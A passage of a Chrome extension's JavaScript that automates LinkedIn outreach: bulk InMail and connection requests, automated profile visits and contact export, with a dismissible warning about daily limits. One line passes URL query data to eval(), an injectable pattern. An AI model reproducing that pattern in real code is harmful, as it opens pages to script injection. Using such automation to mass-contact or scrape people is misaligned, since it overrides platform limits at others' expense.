                                $('<div />',{id:'leo_gray_overlay'}).appendTo(connect_warn_html);
                                var connect_warn_text = $('<div />',{id:'leo_warn_text'});
                                connect_warn_text.append($('<div />',{class:'leo_para',style:'width: 75px;'}).html('<img src="'+chrome.runtime.getURL('images/logo.png')+'" width="64" />'));
                                var connect_warn_text_p = $('<div />',{class:'leo_para',style:'width: calc(100% - 115px);'});
                                connect_warn_text_p.append($('<div />').text('Hey '+user_details.firstname+','));
                                if (account_type == 'Sales Navigator') {
                                    connect_warn_text_p.append($('<div />').html("I detected you have a <strong>Sales Navigator account.</strong>"));
                                } else if(account_type == 'Premium'){
                                    connect_warn_text_p.append($('<div />').html('I detected you have a <strong>Premium LinkedIn membership.</strong>'));
                                } else if (account_type == 'Basic') {
                                    connect_warn_text_p.append($('<div />').html('I detected you have a <strong>Basic LinkedIn membership.</strong>'));
                                }
                                connect_warn_text_p.append($('<div />').html('I recommend that you consider adjusting your limit for this feature to maximum of <strong>'+(maxMsgLimit - 1)+' per day</strong>'));
                                connect_warn_text_p.append($('<div />',{style:'margin-bottom:20px;',class:'leo_notice'}).text('Would you like to revise your activity before I proceed?'));
                                connect_warn_text_p.append($('<div />',{style:'margin-bottom:20px;',class:'leo_notice'}).text('Note: This is just a guideline.'));
                                connect_warn_text.append(connect_warn_text_p);
                                var leo_btn_cont = $('<div />',{class:'leo_btn_cont'});
                                var cancelBtn = $('<button />').text("Yes. I'll review")
                                leo_btn_cont.append(cancelBtn);
                                var okBtn = $('<button />').text('Proceed. I accept the risks');
                                leo_btn_cont.append(okBtn);
                                leo_btn_cont.appendTo(connect_warn_text);
                                connect_warn_text.append($('<div />',{style:'margin-left: 85px;margin-top: 20px;float: left;'}).html('<div class="squaredThree" style="margin:0 0 20px 0;"><input type="checkbox" id="dont_show"><label for="dont_show">Don\'t show this warning again.</label></div>'));
                                connect_warn_text.appendTo(connect_warn_html);
                                connect_warn_html.appendTo($('body'));
                                cancelBtn.bind('click', function(){
                                    $("#leo_connect_warn").remove();
                                });
                                okBtn.bind('click', function(){
                                    $("#leo_connect_warn").remove();
                                    continueMethod();
                                });
                                $("#dont_show").bind("change", function(){
                                    var checked_val = $(this).is(":checked");
                                    chrome.storage.local.set({'dont_show_connect_warning': checked_val});
                                })
                            } else {
                                continueMethod();
                            }
                        })
                    }
                })
            }
            $(".leo-notice").removeClass("error");
        } else {
            // showNotification("Please select 1st connections only!");
            $(".leo-notice").addClass("error");
            return false;
        }
    })

    $("#start_sending_inm").bind("click", function() {
        var facetArr = [];
        var isSavedSearch = location.search.indexOf('savedSearchId') >= 0 ? true : false;
        if(isSavedSearch){
            if(isSalesNav){
                $(".facet-list > li").map(function(){
                    var facetVal = $(this).find(".selected-value-pill[data-value]").map(function(){
                        return $(this).attr("data-value")
                    }).toArray();
                    var facetKey = $(this).attr('class').replace('facet ','');
                    if ( facetVal && facetVal.length > 0 && facetKey == 'N'){
                        facetArr.push(facetVal);
                    }
                })
            }
        } else {
            if(isSalesNav){
                location.search.split('&').forEach(function(e){
                    if(e.indexOf('facet.N') >= 0){
                        facetArr.push(e.split('=')[1]);
                    }
                })
            } else {
                location.search.split('&').forEach(function(e){
                    if(e.match('facetNetwork')){
                        facetArr = eval(unescape(e).split("=")[1]);
                    }
                })
            }
        }
        if ( (
            ( search_records_count > 0 || ( !isSalesNav && ( $("#sf-facetNetwork-F").is(":checked") || $("#sf-facetNetwork-S").is(":checked") || $("#sf-facetNetwork-O").is(":checked") ) ) ) ||
            ( search_records_count > 0 || ( isSalesNav && ( facetArr.indexOf('F') >= 0 || facetArr.indexOf('S') >= 0 || facetArr.indexOf('O') >= 0 || facetArr.indexOf('A') >= 0 ) ) )
            ) && search_records_count > 0) {
            var sel_inm_type = $("#inm_div .template_selection").val();
            if (sel_inm_type == 'custom') {
                var custom_inm_text = $("#custom_inm").val();
                var custom_inm_subject = $("#custom_inm_subject").val();
                if (!custom_inm_text) {
                    showNotification(local_strings['CUSTOM_MSG']);
                    return false;
                } else if(!custom_inm_subject){
                    showNotification(local_strings['CUSTOM_INMAIL']);
                    return false;
                } else {
                    local_data.selectedInMail = custom_inm_text;
                    local_data.selectedInMailSubject = custom_inm_subject;
                }
            }
            if (!local_data.selectedInMail) {
                showNotification(local_strings['SELECT_INMAIL']);
                populateInMails(true);
                return false;
            }
            if (local_data.REMAINING_INMAILS <= 0) {
                local_data.REMAINING_INMAILS = 0;
                showNotification(local_strings['MAX_INMAIL_SENT']);
                return false;
            }
            if ($("#start_sending_inm").hasClass("started")) {
                $("#start_sending_inm").text("SEND");
                $("#start_sending_inm").removeClass("started");
                setStopLeonardBtn(false);
                clearInterval(nextViewInter);
                nextViewInter = null;
                clearTimeout(nextViewTimer);
                nextViewTimer = null;
                $(".leo_visiting").find(".time_rem_span").remove();
                $(".leo_visiting").removeClass("leo_visiting");
                chrome.runtime.sendMessage({
                    removeBadge: true
                });
                chrome.storage.local.set({
                    nextPageRedirect: false
                });
                local_data.rim = local_data.REMAINING_INMAILS;
                local_data.startedMailing = false;
            } else {
                var continueMethod = function(){
                    local_data.startedMailing = true;
                    local_data.rim = parseInt($("#inm_range_slider").val());
                    $("#start_sending_inm").text(local_strings['STOP']);
                    $("#start_sending_inm").addClass("started");
                    setStopLeonardBtn(true);
                    finished_inms_in_remaining = 0;
                    local_data.currentIdx = 0;
                    currentIdx = 0;
                    leonard_stopped = false;
                    closePopup();
                    startMailing();
                    // authorizeByAccount(function(){
                    // })
                }
                var countSel = parseInt($("#inm_range_slider").val());
                getAccountType(function(account_type){
                    if(account_type == 'Sales Navigator'){
                        continueMethod();
                    } else {
                        local_data.account_type = account_type;
                        var maxInMailLimit = account_type == 'Sales Navigator' ? 100 : account_type == 'Premium' ? 50 : 25;
                        maxInMailLimit++;
                        chrome.storage.local.get('dont_show_connect_warning', function(settings){
                            if(!settings.dont_show_connect_warning && countSel >= maxInMailLimit){
                                var connect_warn_html = $('<div />',{id:'leo_connect_warn'});
                                $('<div />',{id:'leo_gray_overlay'}).appendTo(connect_warn_html);
                                var connect_warn_text = $('<div />',{id:'leo_warn_text'});
                                connect_warn_text.append($('<div />',{class:'leo_para',style:'width: 75px;'}).html('<img src="'+chrome.runtime.getURL('images/logo.png')+'" width="64" />'));
                                var connect_warn_text_p = $('<div />',{class:'leo_para',style:'width: calc(100% - 115px);'});
                                connect_warn_text_p.append($('<div />').text('Hey '+user_details.firstname+','));
                                if (account_type == 'Sales Navigator') {
                                    connect_warn_text_p.append($('<div />').html("I detected you have a <strong>Sales Navigator account.</strong>"));
                                } else if(account_type == 'Premium'){
                                    connect_warn_text_p.append($('<div />').html('I detected you have a <strong>Premium LinkedIn membership.</strong>'));
                                } else if (account_type == 'Basic') {
                                    connect_warn_text_p.append($('<div />').html('I detected you have a <strong>Basic LinkedIn membership.</strong>'));
                                }
                                connect_warn_text_p.append($('<div />').html('I recommend that you consider adjusting your limit for this feature to maximum of <strong>'+(maxInMailLimit - 1)+' per day</strong>'));
                                connect_warn_text_p.append($('<div />',{style:'margin-bottom:20px;',class:'leo_notice'}).text('Would you like to revise your activity before I proceed?'));
                                connect_warn_text.append(connect_warn_text_p);
                                var leo_btn_cont = $('<div />',{class:'leo_btn_cont'});
                                var cancelBtn = $('<button />').text("Yes. I'll review")
                                leo_btn_cont.append(cancelBtn);
                                var okBtn = $('<button />').text('Proceed. I accept the risks');
                                leo_btn_cont.append(okBtn);
                                leo_btn_cont.appendTo(connect_warn_text);
                                connect_warn_text.append($('<div />',{style:'margin-left: 85px;margin-top: 20px;float: left;'}).html('<div class="squaredThree" style="margin:0 0 20px 0;"><input type="checkbox" id="dont_show"><label for="dont_show">Don\'t show this warning again.</label></div>'));
                                connect_warn_text.appendTo(connect_warn_html);
                                connect_warn_html.appendTo($('body'));
                                cancelBtn.bind('click', function(){
                                    $("#leo_connect_warn").remove();
                                });
                                okBtn.bind('click', function(){
                                    $("#leo_connect_warn").remove();
                                    continueMethod();
                                });
                                $("#dont_show").bind("change", function(){
                                    var checked_val = $(this).is(":checked");
                                    chrome.storage.local.set({'dont_show_connect_warning': checked_val});
                                })
                            } else {
                                continueMethod();
                            }
                        })
                    }
                })
            }
        } else {
            showNotification(local_strings['SELECT_RELATION']);
            return false;
        }
    })

    $("#start_sending_conn").bind("click", function() {
        //var sel_inv_type = $("#inv_div .template_selection").val();
        var sel_inv_type = $("#selInvMes").val();
        if (sel_inv_type == 'custom') {
            var custom_inv_msg_text = $("#custom_inv_msg").val();
            if (!custom_inv_msg_text) {
                showNotification(local_strings['CUSTOM_INV_MSG']);
                return false;
            } else {
                local_data.selectedInvitationMessage = custom_inv_msg_text;
            }
        }
        //var sel_fol_type = $("#fol_div .template_selection").val();
        var sel_fol_type = $("#selFollUpMes").val();
        if (sel_fol_type == 'custom') {
            var custom_fol_msg_text = $("#custom_fol_msg").val();
            if (!custom_fol_msg_text) {
                showNotification(local_strings['CUSTOM_FOL_UP_MSG']);
                return false;
            } else {
                local_data.selectedFollowUpMessage = custom_fol_msg_text;
            }
        }
        if (!local_data.selectedInvitationMessage) {
            showNotification(local_strings['SELECT_INV_MSG']);
            return false;
        }

        if (local_data.REMAINING_CONNECTION_REQUESTS <= 0) {
            local_data.REMAINING_CONNECTION_REQUESTS = 0;
            showNotification(local_strings['MAX_CONN_REQ_SENT']);
            return false;
        }
        if ($("#start_sending_conn").hasClass("started")) {
            $("#start_sending_conn").text(local_strings['SEND']);
            $("#start_sending_conn").removeClass("started");
            setStopLeonardBtn(false);
            clearInterval(nextViewInter);
            nextViewInter = null;
            clearTimeout(nextViewTimer);
            nextViewTimer = null;
            $(".leo_visiting").find(".time_rem_span").remove();
            $(".leo_visiting").removeClass("leo_visiting");
            chrome.runtime.sendMessage({
                removeBadge: true
            });
            chrome.storage.local.set({
                nextPageRedirect: false
            });
            local_data.rcr = local_data.REMAINING_CONNECTION_REQUESTS;
            local_data.startedSending = false;
        } else {
            var continueMethod = function(){
                local_data.startedSending = true;
                local_data.rcr = parseInt($("#conn_range_slider").val());
                $("#start_sending_conn").text(local_strings['STOP']);
                $("#start_sending_conn").addClass("started");
                setStopLeonardBtn(true);
                finished_conns_in_remaining = 0;
                local_data.currentIdx = 0;
                currentIdx = 0;
                leonard_stopped = false;
                authorizeByPlan(function(){
                    closePopup();
                    startSending();
                });
            }
            var countSel = parseInt($("#conn_range_slider").val());
            getAccountType(function(account_type){
                if(account_type == 'Sales Navigator'){
                    continueMethod();
                } else {
                    local_data.account_type = account_type;
                    var maxConnReqLimit = account_type == 'Sales Navigator' ? 100 : account_type == 'Premium' ? 50 : 25;
                    maxConnReqLimit++;
                    chrome.storage.local.get('dont_show_connect_warning', function(settings){
                        if(!settings.dont_show_connect_warning && countSel >= maxConnReqLimit){
                            var connect_warn_html = $('<div />',{id:'leo_connect_warn'});
                            $('<div />',{id:'leo_gray_overlay'}).appendTo(connect_warn_html);
                            var connect_warn_text = $('<div />',{id:'leo_warn_text'});
                            connect_warn_text.append($('<div />',{class:'leo_para',style:'width: 75px;'}).html('<img src="'+chrome.runtime.getURL('images/logo.png')+'" width="64" />'));
                            var connect_warn_text_p = $('<div />',{class:'leo_para',style:'width: calc(100% - 115px);'});
                            connect_warn_text_p.append($('<div />').text('Hey '+user_details.firstname+','));
                            if (account_type == 'Sales Navigator') {
                                connect_warn_text_p.append($('<div />').html("I detected you have a <strong>Sales Navigator account.</strong>"));
                            } else if(account_type == 'Premium'){
                                connect_warn_text_p.append($('<div />').html('I detected you have a <strong>Premium LinkedIn membership.</strong>'));
                            } else if (account_type == 'Basic') {
                                connect_warn_text_p.append($('<div />').html('I detected you have a <strong>Basic LinkedIn membership.</strong>'));
                            }
                            connect_warn_text_p.append($('<div />').html('I recommend that you consider adjusting your limit for this feature to maximum of <strong>'+(maxConnReqLimit - 1)+' per day</strong>'));
                            connect_warn_text_p.append($('<div />',{style:'margin-bottom:20px;',class:'leo_notice'}).text('Would you like to revise your activity before I proceed?'));
                            connect_warn_text.append(connect_warn_text_p);
                            var leo_btn_cont = $('<div />',{class:'leo_btn_cont'});
                            var cancelBtn = $('<button />').text("Yes. I'll review")
                            leo_btn_cont.append(cancelBtn);
                            var okBtn = $('<button />').text('Proceed. I accept the risks');
                            leo_btn_cont.append(okBtn);
                            leo_btn_cont.appendTo(connect_warn_text);
                            connect_warn_text.append($('<div />',{style:'margin-left: 85px;margin-top: 20px;float: left;'}).html('<div class="squaredThree" style="margin:0 0 20px 0;"><input type="checkbox" id="dont_show"><label for="dont_show">Don\'t show this warning again.</label></div>'));
                            connect_warn_text.appendTo(connect_warn_html);
                            connect_warn_html.appendTo($('body'));
                            cancelBtn.bind('click', function(){
                                $("#leo_connect_warn").remove();
                            });
                            okBtn.bind('click', function(){
                                $("#leo_connect_warn").remove();
                                continueMethod();
                            });
                            $("#dont_show").bind("change", function(){
                                var checked_val = $(this).is(":checked");
                                chrome.storage.local.set({'dont_show_connect_warning': checked_val});
                            })
                        } else {
                            continueMethod();
                        }
                    })
                }
            })
        }
    })
    // updateLocalData();
    // $(".template_selection").trigger("change");
}

function getContentHTML(selected_tab){
    var popover_html = $(local_data.frameDoc.body).find("#" + selected_tab + "_content").html();
    if(user_details.user_type == 'Free' && ((new Date()-new Date(user_details.date_joined)) > trial_days_in_ms)){
        showUpgradePage(function(upgrade_page_cont){
            popover_html = upgrade_page_cont;
        });
        return popover_html;
    } else if((selected_tab == 'visit_profiles' && local_data.rpv == 0) || (selected_tab == 'connection_invitation' && local_data.rcr == 0) || (selected_tab == 'message' && local_data.rm == 0) || (selected_tab == 'inmail' && local_data.rim == 0)){
        showTimerPage(function(timer_page_cont){
            popover_html = timer_page_cont;
        });
        return popover_html;
    } else {
        popover_html = popover_html
            .replace(/range_slider_temp/, 'range_slider')
            .replace(/remaining_temp/, 'remaining')
            .replace(/remaining_conn_req_temp/, 'remaining_conn_req')
            .replace(/conn_range_slider_temp/, 'conn_range_slider')
            .replace(/selInvMes_temp/, 'selInvMes')
            .replace(/selFollUpMes_temp/, 'selFollUpMes')
            .replace(/start_sending_conn_temp/, 'start_sending_conn')
            .replace(/start_viewing_temp/, 'start_viewing')
            .replace(/custom_inv_msg_temp/, 'custom_inv_msg')
            .replace(/custom_fol_msg_temp/, 'custom_fol_msg')
            .replace(/inv_div_temp/, 'inv_div')
            .replace(/fol_div_temp/, 'fol_div')
            .replace(/conn_inv_tags_temp/, 'conn_inv_tags')
            .replace(/conn_inv_respond_temp/,'conn_inv_respond')
            .replace(/autoFollowUp_temp/g,'autoFollowUp')
            .replace(/msg_range_slider_temp/, 'msg_range_slider')
            .replace(/remaining_msg_req_temp/, 'remaining_msg_req')
            .replace(/msg_div_temp/, 'msg_div')
            .replace(/selMes_temp/, 'selMes')
            .replace(/custom_msg_temp/, 'custom_msg')
            .replace(/start_att_msg_temp/, 'start_att_msg')
            .replace(/start_sending_msg_temp/, 'start_sending_msg')
            .replace(/message_tags_temp/, 'message_tags')
            .replace(/start_sending_inm_temp/, 'start_sending_inm')
            .replace(/inm_range_slider_temp/, 'inm_range_slider')
            .replace(/remaining_inm_req_temp/, 'remaining_inm_req')
            .replace(/inm_div_temp/, 'inm_div')
            .replace(/selInm_temp/, 'selInm')
            .replace(/start_att_inm_temp/, 'start_att_inm')
            .replace(/custom_inm_subject_temp/, 'custom_inm_subject')
            .replace(/custom_inm_temp/, 'custom_inm')
            .replace(/inmails_tags_temp/, 'inmails_tags')
            .replace(/view_tags_temp/, 'view_tags')
            .replace(/export_campaign_conn_temp/g, 'export_campaign_conn')
            .replace(/export_campaign_msg_temp/g, 'export_campaign_msg')
            .replace(/export_campaign_mail_temp/g, 'export_campaign_mail')
            .replace(/export_campaign_visit_temp/g, 'export_campaign_visit')
            .replace(/auto_follow_users_temp/g, 'auto_follow_users')
            .replace(/skip_profile_with_no_pic_visit_temp/g, 'skip_profile_with_no_pic_visit')
            .replace(/skip_profile_with_no_pic_conn_temp/g, 'skip_profile_with_no_pic_conn')
            .replace(/skip_profile_with_no_pic_msg_temp/g, 'skip_profile_with_no_pic_msg')
            .replace(/skip_profile_with_no_pic_mail_temp/g, 'skip_profile_with_no_pic_mail')
            .replace(/auto_endorse_users_temp/g, 'auto_endorse_users')
            .replace(/scan_tags_temp/g, 'scan_tags')
            .replace(/skip_profile_with_no_pic_scan_temp/g, 'skip_profile_with_no_pic_scan')
            .replace(/export_campaign_scan_temp/g, 'export_campaign_scan')
            .replace(/start_scanning_temp/g, 'start_scanning');
    }
    return popover_html;
}

function addListenersToFrame(){
    $(local_data.frameDoc.body).find("#leonard_operations li").on("click", function(){
        var that = this;
        var selected_tab = $(this).attr('data-tab');
        if ($(this).attr("disabled") == "disabled") {
            if(!initializingPopups){
                if($(this).hasClass('upgrade_membership')){
                    showNotification("Feature not available on "+user_details.user_type+" Plan.\nClick here to upgrade.", 'payment');
                } else if($(this).text() == 'InMail' && !isSalesNav){
                    showNotification(local_strings['ONLY_SALES_NAV']);
                } else if(selected_tab == 'export'){
                    // showNotification("I'm downloading your 1st connections data.\nPlease wait till Export is active!");
                    chrome.runtime.sendMessage({
                        showProgress: true,
                        completed: parseInt(currentScrapeIdx*100/connections_all.length)
                    })
                } else {
                    showNotification($(this).text() + local_strings['UNDER_DEVELOPMENT']);
                }
            }
            return false;
        }
        if(selected_tab == 'export'){
            chrome.runtime.sendMessage({
                exportContacts : true
            });
            return false;
        }
        if (selected_tab != 'go_to_crm') {
            $(local_data.frameDoc.body).find("#leonard_operations li").removeClass("active");
            $(that).addClass("active");
            $(local_data.frameDoc.body).find("#leonard_mod_content").html(getContentHTML(selected_tab));
            return false;
        }
    })
}

function showTimerPage(callback) {
    var extMainCont = $('#srp_main_');
    if (extMainCont.length == 0 && !isSalesNav) {
        extMainCont = $(".sub-nav--trans-nav");
    } else if (isSalesNav) {
        extMainCont = $(".spotlights-wrapper");
    }
    var timer_page = chrome.extension.getURL('template/timer.html');
    $.ajax({
        url : timer_page,
        async : false,
        success : function(resp) {
            resp.match(/{{(.*?)}}/g).forEach(function(a) {
                var m = local_data[a.replace(/\{|\}/g, '')] || 0;
                resp = resp.replace(a, m);
            })
            if(typeof callback == 'function'){
                callback(resp);
                startResetTimer();
            }
        }
    });
}

function showUpgradePage(callback) {
    var extMainCont = $('#srp_main_');
    if (extMainCont.length == 0 && !isSalesNav) {
        extMainCont = $(".sub-nav--trans-nav");
    } else if (isSalesNav) {
        extMainCont = $(".spotlights-wrapper");
    }
    var upgrade_page = chrome.extension.getURL('template/upgrade.html');
    $.ajax({
        url : upgrade_page,
        async : false,
        success : function(resp) {
            var resp_matches = resp.match(/{{(.*?)}}/g);
            if(resp_matches && resp_matches.length > 0){
                resp_matches.forEach(function(a) {
                    var m = local_data[a.replace(/\{|\}/g, '')] || 0;
                    resp = resp.replace(a, m);
                })
            }
            if(typeof callback == 'function'){
                callback(resp);
            }
        }
    });
}

function startResetTimer() {
    if (resetInter) {
        clearInterval(resetInter);
        resetInter = false;
    }
    resetInter = setInterval(function() {
        $("#time_remaining_to_reset").text(local_strings['LEO_RESETS'] + getNextDateTimeStamp());
    }, 500);
}

function startViewing() {
    if (search_records_count < 1) {
        setupExtensionVars(function() {
            startViewing();
        });
        return false;
    }
    // local_data.rpv = local_data.REMAINING_PROFILE_VIEWS;
    checkForRandom(function(){
        setupExtensionVars(function() {
            updateLocalData(function() {
                var cont_div = $(".results-list > li").eq(currentIdx);
                if (isSalesNav) {
                    cont_div = $("#results-list > li").eq(currentIdx);
                }
                if(cont_div.length == 0){
                    cont_div = $(".search-results__list > li").eq(currentIdx);
                }
                if(cont_div.length == 0 && isSalesNav){
                    cont_div = $(".search-results .search-results__result-list li.search-results__result-item").eq(currentIdx);
                }
                // if($(".search-results li.search-result").length > 0){
                //     cont_div = $(".search-results li.search-result").eq(currentIdx);
                // }
                if (viewPremiumOnly) {
                    while (cont_div.find(".premium-icon, .premiumicon, .linkedin-premium-icon, .m-type--premium").length == 0 && currentIdx <= search_records_count) {
                        if(leonard_stopped){
                            break;
                        }
                        currentIdx++;
                        cont_div = $(".results-list > li").eq(currentIdx);
                        if ($("#results").length > 0) {
                            cont_div = $("#results > li[data-li-entity-id]").eq(currentIdx);
                        } else if ($("#results-list").length > 0) {
                            cont_div = $("#results-list > li").eq(currentIdx);
                        }
                        if(cont_div.length == 0){
                            cont_div = $(".search-results__list > li").eq(currentIdx);
                        }
                        if(cont_div.length == 0 && isSalesNav){
                            cont_div = $(".search-results .search-results__result-list li.search-results__result-item").eq(currentIdx);
                        }
                        // if($(".search-results li.search-result").length > 0){
                        //     cont_div = $(".search-results li.search-result").eq(currentIdx);
                        // }
                        if(cont_div.next().hasClass("search-result__occlusion-hint")){
                            var elOffset = cont_div.offset().top;
                            var elHeight = cont_div.height();
                            var windowHeight = $(window).height();
                            var offset;
                            if (elHeight < windowHeight) {
                                offset = elOffset - ((windowHeight / 2) - (elHeight / 2));
                            } else {
                                offset = elOffset;
                            }
                            $('html, body').animate({
                                scrollTop: offset
                            }, 100);
                            setTimeout(startViewing, 1000);
                            return false;
                        }
                    }
                    if(leonard_stopped){
                        stopLeonard();
                        return false
                    }
                }
                if (skipProfileWithNoPicVisit) {
                    while ((cont_div.find(".search-result__image img, .result-lockup__icon-link img").hasClass('ghost-person') || cont_div.find(".person-ghost").length > 0 || cont_div.find(".search-result__image-wrapper .ghost-person").length > 0) && currentIdx <= search_records_count) {
                        if(leonard_stopped){
                            break;
                        }
                        currentIdx++;
                        cont_div = $(".results-list > li").eq(currentIdx);
                        if ($("#results").length > 0) {
                            cont_div = $("#results > li[data-li-entity-id]").eq(currentIdx);
                        } else if ($("#results-list").length > 0) {
                            cont_div = $("#results-list > li").eq(currentIdx);
                        }
                        if(cont_div.length == 0){
                            cont_div = $(".search-results__list > li").eq(currentIdx);
                        }
                        if(cont_div.length == 0 && isSalesNav){
                            cont_div = $(".search-results .search-results__result-list li.search-results__result-item").eq(currentIdx);
                        }
                        // if($(".search-results li.search-result").length > 0){
                        //     cont_div = $(".search-results li.search-result").eq(currentIdx);
                        // }
                        if(cont_div.next().hasClass("search-result__occlusion-hint")){
                            var elOffset = cont_div.offset().top;
                            var elHeight = cont_div.height();
                            var windowHeight = $(window).height();
                            var offset;
                            if (elHeight < windowHeight) {
                                offset = elOffset - ((windowHeight / 2) - (elHeight / 2));
                            } else {
                                offset = elOffset;
                            }
                            $('html, body').animate({
                                scrollTop: offset
                            }, 100);
                            setTimeout(startViewing, 1000);
                            return false;
                        }
                    }
                    if(leonard_stopped){
                        stopLeonard();
                        return false
                    }
                }
                if ((cont_div.length == 0 && finished_in_remaining > 0) || currentIdx > search_records_count - 1) {
                    chrome.storage.local.set({
                        nextPageRedirect: {
                            count: finished_in_remaining
                        }
                    }, function() {
                        if ($(".next").length > 0) {
                            $(".next").trigger('click')
                        } else if ($(".next a").length > 0) {
                            window.location.href = location.origin + $(".next a").attr("href");
                        } else if (isSalesNav && $(".next-pagination").length > 0) {
                            $(".next-pagination")[0].click();
                        } else if (isSalesNav && $(".search-results__pagination-next-button").length > 0) {
                            $(".search-results__pagination-next-button").click();
                        } else {
                            showNotification(local_strings['NO_PROFILES']);
                            downloadCSVIfEnabled();
                            stopLeonard();
                            return false;
                        }
                        startNextPageTimer('view');
                    });
                    return false;
                }
                if (cont_div.length == 0 || (!isSalesNav && cont_div.find("div > a:first").length == 0) || (isSalesNav && cont_div.find(".result-lockup__name").length > 0 && cont_div.find(".result-lockup__name a").length == 0)) {
                    activateThisTab(function() {
                        setTimeout(function() {
                            $("#start_viewing").text("STOP");
                            $("#start_viewing").addClass("started");
                            setStopLeonardBtn(true);
                            leonard_stopped = false;
                            startViewing();
                        }, 1000);
                    })
                    // showNotification(local_strings['ACTIVATE_LINKEDIN']);
                    stopLeonard(true);
                    return false;
                }
                var elOffset = cont_div.offset().top;
                var elHeight = cont_div.height();
                var windowHeight = $(window).height();
                var offset;
                if (elHeight < windowHeight) {
                    offset = elOffset - ((windowHeight / 2) - (elHeight / 2));
                } else {
                    offset = elOffset;
                }
                $('html, body').animate({
                    scrollTop: offset
                }, 100);
                /* code for scrolling into view (ember bug)*/
                if (cont_div.hasClass("search-result__occlusion-hint")) {
                    setTimeout(startViewing, 1000);
                    return false;
                }
                if(cont_div.find(".search-result__actions").length == 0 && cont_div.find(".content-wrapper").length == 0 && cont_div.find(".bd").length == 0 && cont_div.find(".result-lockup__actions").length == 0){
                    currentIdx++;
                    startViewing(currentIdx);
                    return false;
                }
                
                var entityUrn, profile_link;
                if(cont_div.find("div > a:first").length > 0){
                    entityUrn = cont_div.find("div > a:first").attr("href").slice(4, -1);
                    profile_link = cont_div.find("div > a:first").attr("href");
                } else if(cont_div.find(".result-lockup__name a").length > 0){
                    profile_link = cont_div.find(".result-lockup__name a").attr("href");
                }
                if(profile_link){
                    var entityUrnMatch = profile_link.match(/sales\/.*?\/(.*?),/);
                    if(entityUrnMatch && entityUrnMatch.length > 0){
                        entityUrn = profile_link.match(/sales\/.*?\/(.*?),/)[1];
                    }
                }
                var tracking_id = cont_div.find("div > a").attr("data-control-id");
                var member_id;
                var view_url = cont_div.find("div > a:first").attr("href");
                if (isSalesNav) {
                    view_url = cont_div.find("a.name-link").length > 0 && cont_div.find("a.name-link")[0].href;
                    if(!view_url){
                        view_url = cont_div.find(".result-lockup__name a").attr("href");
                    }
                    member_id = cont_div.find("[name=memberId]").val();
                } else {
                    if (idUrnMapObj[tracking_id] && idUrnMapObj[tracking_id].member_id) {
                        member_id = idUrnMapObj[tracking_id].member_id.slice(14);
                    }
                }
                if (view_url.indexOf('www.linkedin.com') == -1) {
                    view_url = 'https://www.linkedin.com' + view_url;
                }
                var view_found_idx;
                if (!views) {
                    setTimeout(function() {
                        showNotification(local_strings['REQ_SERVER']);
                        startViewing();
                    }, 3000);
                    return false;
                }
                views.forEach(function(view, idx) {
                    if( ( view.entityUrn == entityUrn ) || 
                        ( view.viewed_linkedin_profile_id == entityUrn ) || 
                        ( view.member_id == member_id && member_id ) ){
                        view_found_idx = idx;
                    }
                });
                cont_div.find(".time_rem_span").remove();
                if(isProfileSkipped(entityUrn) || isProfileSkipped(member_id)){
                    cont_div.find(".search-result__actions").prepend($('<span />', {
                        'class': 'time_rem_span'
                    }).text(local_strings['SKIPPED']));
                    if (isSalesNav && cont_div.find(".content-wrapper").length > 0) {
                        cont_div.find(".content-wrapper").prepend($('<span />', {
                            'class': 'time_rem_span'
                        }).text(local_strings['SKIPPED']));
                    } else if (cont_div.find(".bd").length > 0) {
                        cont_div.find(".bd").prepend($('<span />', {
                            'class': 'time_rem_span'
                        }).text(local_strings['SKIPPED']));
                    } else if(cont_div.find(".result-lockup__actions").length > 0) {
                        cont_div.find(".result-lockup__actions").append($('<span />', {
                            'class': 'time_rem_span'
                        }).text(local_strings['SKIPPED']));
                    }
                    cont_div.addClass("leo_skipped");
                    currentIdx++;
                    startViewing(currentIdx);
                } else if (views[view_found_idx]) {
                    // views[view_found_idx]['skipped']++;
                    var VIEWED_ALREADY_TEXT  = 'Visited the profile in last '+user_details.skipVisit+' day(s)';
                    cont_div.find(".search-result__actions").prepend($('<span />', {
                        'class': 'time_rem_span'
                    }).text(VIEWED_ALREADY_TEXT));
                    if (isSalesNav && cont_div.find(".content-wrapper").length > 0) {
                        cont_div.find(".content-wrapper").prepend($('<span />', {
                            'class': 'time_rem_span'
                        }).text(VIEWED_ALREADY_TEXT));
                    } else if (cont_div.find(".bd").length > 0) {
                        cont_div.find(".bd").prepend($('<span />', {
                            'class': 'time_rem_span'
                        }).text(VIEWED_ALREADY_TEXT));
                    } else if(cont_div.find(".result-lockup__actions").length > 0) {
                        cont_div.find(".result-lockup__actions").append($('<span />', {
                            'class': 'time_rem_span'
                        }).text(VIEWED_ALREADY_TEXT));
                    }
                    cont_div.addClass("leo_skipped");
                    currentIdx++;
                    startViewing(currentIdx);
                } else {
                    cont_div.find(".time_rem_span").remove();
                    cont_div.addClass("leo_visiting");
                    cont_div.find(".search-result__actions").prepend($('<span />', {
                        'class': 'time_rem_span'
                    }).text(local_strings['VISITING']));
                    if (isSalesNav && cont_div.find(".content-wrapper").length > 0) {
                        cont_div.find(".content-wrapper").prepend($('<span />', {
                            'class': 'time_rem_span'
                        }).text(local_strings['VISITING']));
                    } else if (cont_div.find(".bd").length > 0) {
                        cont_div.find(".bd").prepend($('<span />', {
                            'class': 'time_rem_span'
                        }).text(local_strings['VISITING']));
                    } else if(cont_div.find(".result-lockup__actions").length > 0) {
                        cont_div.find(".result-lockup__actions").append($('<span />', {
                            'class': 'time_rem_span'
                        }).text(local_strings['VISITING']));
                    }
                    var moduleKey, pageKey, contextId, requestId, pageNumber, authToken, authType;
                    openInNewTabAndScrape(view_url, function(response){
                        if(!response){
                            cont_div.find(".time_rem_span").remove();
                            cont_div.addClass("leo_visit_error");
                            cont_div.find(".search-result__actions").prepend($('<span />', {
                                'class': 'time_rem_span'
                            }).text(local_strings['UNABLE_TO_VIEW']));
                            if (isSalesNav && cont_div.find(".content-wrapper").length > 0) {
                                cont_div.find(".content-wrapper").prepend($('<span />', {
                                    'class': 'time_rem_span'
                                }).text(local_strings['UNABLE_TO_VIEW']));
                            } else if (cont_div.find(".bd").length > 0) {
                                cont_div.find(".bd").prepend($('<span />', {
                                    'class': 'time_rem_span'
                                }).text(local_strings['UNABLE_TO_VIEW']));
                            } else if(cont_div.find(".result-lockup__actions").length > 0) {
                                cont_div.find(".result-lockup__actions").append($('<span />', {
                                    'class': 'time_rem_span'
                                }).text(local_strings['UNABLE_TO_VIEW']));
                            }
                            currentIdx++;
                            local_data.frame_id && $("#"+local_data.frame_id).remove();
                            startViewing(currentIdx);
                        } else {
                            if(isSalesNav){
